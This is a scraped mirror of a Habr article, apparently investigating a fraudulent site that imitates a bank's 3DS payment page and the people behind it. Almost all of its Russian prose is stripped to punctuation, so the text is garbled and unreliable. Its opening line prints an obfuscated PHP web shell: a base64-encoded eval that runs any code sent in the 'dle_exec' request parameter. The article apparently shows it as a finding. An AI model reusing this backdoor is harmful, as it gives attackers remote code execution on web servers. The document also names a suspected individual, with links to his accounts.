<span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,
</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title"> .       </b><div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br>
<br>
     ,      ,  ,  Â«Â»      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">     email  </b><div class="spoiler_text">     ,  EMAIL.  :<br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"> <br>
       3ds.payment.ru       <code>Lakhtin@psbank.ru</code>.<br>
<br>
 ,      ? ,    - . , ,     Mastercard     3DS.<br>
<br>
<code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code><br>
<br>
<div class="spoiler"><b class="spoiler_title">         Mastercard</b><div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br>
</div></div><br>
 email            .      -      .      -         . ..  - ,      ,     ,      - .<br>
<br>
  ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      .<br>
<br>
          . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br>
<br>
       ?         ,     .  email  , , .     .   -  ,     -   ,        .</div></div><br>
<div class="spoiler"><b class="spoiler_title">   ?</b><div class="spoiler_text">    ,     , Â«Â»   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br>
<br>
     ,      .       ?   ?  ?<br>
 ,          ,     .<br>
<br>
<img src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br>
<br>
<img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br>
<br>
<img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br>
<br>
      .   . -    .<br>
<br>
<img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br>
<br>
 :<br>
<br>
Â» <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> â€”      .       .<br>
Â» <code>http://gitchat.org/developers/Valtas</code> â€”     <br>
Â» <code>https://github.com/Valtas</code> â€”    Github<br>
Â» <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code><br>
<br>
       ,  ,     â€”      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">      </b><div class="spoiler_text">  ,        .       ,      .          ,   .<br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a><br>
<br>
    336 .           ,     .      .<br>
<br>
<div class="spoiler"><b class="spoiler_title">        </b><div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br>
</div></div><br>
        ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   Â« Â»         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">.     ?</b><div class="spoiler_text">               .        .           ,     .      ,      .          Â«.  Â».    ,                 .      ,            .               .   .         .<br>
<br>
       ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br>
<br>
       ,     .    ,       . ,              .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">         ,             ,           .     -   -     .       .       ,    .<br>
<br>
<img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br>
<br>
  80   ,          .    ,    .        ,  .     :<br>
<br>
<img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br>
<br>
     56      , Â« Â»,     ,    . <br>
     ,   ,  Â« Â»,     ,     .<br>
<br>
       :<br>
<br>
<img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br>
<br>
<img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br>
<br>
     -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br>
</div></div><br>
</div></div></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr398313/">https://habr.com/ru/post/fr398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr398301/index.html">Maison intelligente ou jouet pour homme: contrÃ´le de la tempÃ©rature</a></li>
<li><a href="../fr398303/index.html">Sept centiÃ¨me Ideapad - examen de l'ordinateur portable de jeu sÃ©rie Y</a></li>
<li><a href="../fr398305/index.html">La traduction du deuxiÃ¨me livre de la sÃ©rie Â«MÃ©moire du passÃ© de la TerreÂ», Â«ForÃªt sombreÂ» - est terminÃ©e. Bonne lecture</a></li>
<li><a href="../fr398309/index.html">ProblÃ¨mes de la robotique moderne 2, ou comment les jeux sauveront le monde ...</a></li>
<li><a href="../fr398311/index.html">Tentacules mÃ©caniques manuels Ã  la maison: Partie 2, Gestion des cÃ¢bles</a></li>
<li><a href="../fr398315/index.html">ĞšĞ°Ğº Ñ„Ğ¾Ñ‚Ğ¾Ğ½Ñ‹ Ğ²Ğ¾ÑĞ¿Ñ€Ğ¸Ğ½Ğ¸Ğ¼Ğ°ÑÑ‚ Ğ²Ñ€ĞµĞ¼Ñ?</a></li>
<li><a href="../fr398317/index.html">House-with-Mind ou automatisation prÃªte Ã  l'emploi</a></li>
<li><a href="../fr398319/index.html">Bart Knolls - Un tueur de moustiques sans compromis</a></li>
<li><a href="../fr398321/index.html">Killing Kindred - Une stratÃ©gie Ã©volutive dÃ©passÃ©e</a></li>
<li><a href="../fr398323/index.html">Les acteurs de la voix des jeux vidÃ©o se prÃ©parent Ã  faire grÃ¨ve pour les dÃ©veloppeurs</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>